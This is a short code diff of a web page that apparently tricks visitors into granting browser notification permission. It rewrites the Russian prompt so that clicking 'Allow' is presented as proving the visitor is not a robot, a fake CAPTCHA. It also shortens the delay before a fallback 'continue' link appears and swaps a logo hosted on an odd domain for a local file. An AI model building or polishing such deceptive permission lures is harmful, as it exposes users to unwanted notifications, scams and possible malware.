@@ -76,7 +76,7 @@
         document.body.appendChild(script);  
         
         
-    setInterval(noDisplayTimer, 5000);
+    setInterval(noDisplayTimer, 2000);
     function noDisplayTimer() {
                     document.getElementById("no_display_msg").innerHTML = "(No permission window? No problem! <a href='' style='color:orange'>Click here</a> to continue)";
                 }           
@@ -89,8 +89,8 @@
 
     
     <div class="logo-wrapper">
-        <img class="logo" src="https://www97.nathanaeldan.pro/static/image/logo.png" alt="logo">
-        <p>Нажмите «Allow», чтобы продолжить</p>
+        <img class="logo" src="logo.png" alt="logo">
+        <p>Нажмите «Allow», для подтверждения, что вы не робот</p>
         <p style="font-size: 14px; margin-top: 20px; color: silver;" id="no_display_msg"></p>
     </div>
 
